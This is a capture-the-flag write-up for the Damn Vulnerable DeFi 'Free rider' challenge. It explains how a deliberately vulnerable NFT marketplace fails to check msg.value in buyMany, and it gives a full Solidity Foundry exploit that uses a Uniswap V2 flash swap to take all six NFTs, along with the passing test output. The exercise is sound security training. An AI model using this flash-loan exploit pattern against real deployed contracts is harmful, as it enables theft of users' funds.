# Damn Vulnerable DeFi (Foundry version)

- [Scope](#scope)
- [Plan](#plan)
- [Solution](#solution)
  - [Proof of Concept](#proof-of-concept)

## Challenge #10 - Free rider - Description

A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.

You want to build some rep with this buyer, so you've agreed with the plan.

Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.

## Scope

| File Name                                                                         | SHA-1 Hash                               |
| --------------------------------------------------------------------------------- | ---------------------------------------- |
| damn-vulnerable-defi-foundry/src/Contracts/free-rider/FreeRiderBuyer.sol          | c3257221b1c239323e6c2c1d2379744e8f6a08d7 |
| damn-vulnerable-defi-foundry/src/Contracts/free-rider/FreeRiderNFTMarketplace.sol | c9b520fac068a5aa7702fd49596c4905e1564bbc |
| damn-vulnerable-defi-foundry/src/Contracts/free-rider/Interfaces.sol              | a0fd58cda9b1368763a82fb7eeb2688dc22f588b |

## Plan

The place that we can get "free" ETH is through `Interfaces.sol` and most specific from [`Uniswap V2's Flash Swap`](https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps). This solves the first problem.

Description gives us a hint that `FreeRiderNFTMarketplace` has a bug. It has four functions that the two of them have to do with buy nft(s). The bug is in [`_buyOne`](https://github.com/cRat1st0s/damn-vulnerable-defi-foundry/blob/b1b61dfe28cbdd8a7f4d3b3e1b73cf2963afc750/src/Contracts/free-rider/FreeRiderNFTMarketplace.sol#L67) when it is called from `buyMany`. It is not checked if the `msg.value` is equal to the sum of the NFTs that we want to buy but it is enough to provide an amount of 15 ETH that is the price for one NFT.

## Solution

1.  Trigger the flash swap.
2.  Buy the NFTs.
3.  Send the NFTs to the buyer.
4.  Pay the fee for the swap.
5.  Repay the flash swap.

<details>
    <summary>Description</summary>

</details>

<details>
    <summary>damn-vulnerable-defi-foundry/test/Levels/free-rider/FreeRider.t.sol</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRider is Test {
    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;
    uint256 internal constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    // The buyer will offer 45 ETH as payout for the job
    uint256 internal constant BUYER_PAYOUT = 45 ether;

    // Initial reserves for the Uniswap v2 pool
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
    uint256 internal constant DEADLINE = 10_000_000;

    FreeRiderBuyer internal freeRiderBuyer;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableToken internal dvt;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;
    WETH9 internal weth;
    address payable internal buyer;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        buyer = payable(address(uint160(uint256(keccak256(abi.encodePacked("buyer"))))));
        vm.label(buyer, "buyer");
        vm.deal(buyer, BUYER_PAYOUT);

        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
        vm.label(deployer, "deployer");
        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);

        // Attacker starts with little ETH balance
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.5 ether);

        // Deploy WETH contract
        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy token to be traded against WETH in Uniswap v2
        vm.startPrank(deployer);
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory =
            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // Note that the function takes care of deploying the pair automatically
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));

        assertEq(uniswapV2Pair.token0(), address(dvt));
        assertEq(uniswapV2Pair.token1(), address(weth));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());

        for (uint8 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(damnValuableNFT.ownerOf(id), deployer);
        }

        damnValuableNFT.setApprovalForAll(address(freeRiderNFTMarketplace), true);

        uint256[] memory NFTsForSell = new uint256[](6);
        uint256[] memory NFTsPrices = new uint256[](6);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
            NFTsForSell[i] = i;
            NFTsPrices[i] = NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        freeRiderNFTMarketplace.offerMany(NFTsForSell, NFTsPrices);

        assertEq(freeRiderNFTMarketplace.amountOfOffers(), AMOUNT_OF_NFTS);
        vm.stopPrank();

        vm.startPrank(buyer);

        freeRiderBuyer = new FreeRiderBuyer{value: BUYER_PAYOUT}(
            attacker,
            address(damnValuableNFT)
        );

        vm.stopPrank();

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker, attacker);

        weth.deposit{value: 0.5 ether}();
        weth.approve(address(this), 0.5 ether);
        weth.approve(attacker, 1 ether);

        bytes memory data = abi.encode(uniswapV2Pair, damnValuableNFT, attacker);
        uniswapV2Pair.swap(0, NFT_PRICE, address(this), data);

        uint256 fee = (NFT_PRICE * 3) / 997 + 1;
        weth.withdraw(0.5 ether - fee);

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */

        // Attacker must have earned all ETH from the payout
        assertGt(attacker.balance, BUYER_PAYOUT);
        assertEq(address(freeRiderBuyer).balance, 0);

        // The buyer extracts all NFTs from its associated contract
        vm.startPrank(buyer);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            damnValuableNFT.transferFrom(address(freeRiderBuyer), buyer, tokenId);
            assertEq(damnValuableNFT.ownerOf(tokenId), buyer);
        }
        vm.stopPrank();

        // Exchange must have lost NFTs and ETH
        assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
        assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        (IUniswapV2Pair pair, DamnValuableNFT nft, address caller) =
            abi.decode(data, (IUniswapV2Pair, DamnValuableNFT, address));

        uint256 fee = (amount1 * 3) / 997 + 1;
        uint256 amountToRepay = amount1 + fee;

        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }
        freeRiderNFTMarketplace.buyMany{value: NFT_PRICE}(tokenIds);

        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            tokenIds[tokenId] = tokenId;
            nft.safeTransferFrom(address(this), address(freeRiderBuyer), tokenId);
        }

        weth.transferFrom(caller, address(this), fee);
        weth.transfer(address(pair), amountToRepay);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
```

</details>

### Proof of Concept

```
./run.sh 10
[⠢] Compiling...
[⠔] Compiling 1 files with 0.8.17
[⠒] Solc 0.8.17 finished in 1.17s
Compiler run successful (with warnings)

Running 1 test for test/Levels/free-rider/FreeRider.t.sol:FreeRider
[PASS] testExploit() (gas: 521756)
Logs:
  🧨 Let's see if you can break it... 🧨

🎉 Congratulations, you can go to the next level! 🎉

Test result: ok. 1 passed; 0 failed; finished in 5.03ms
```
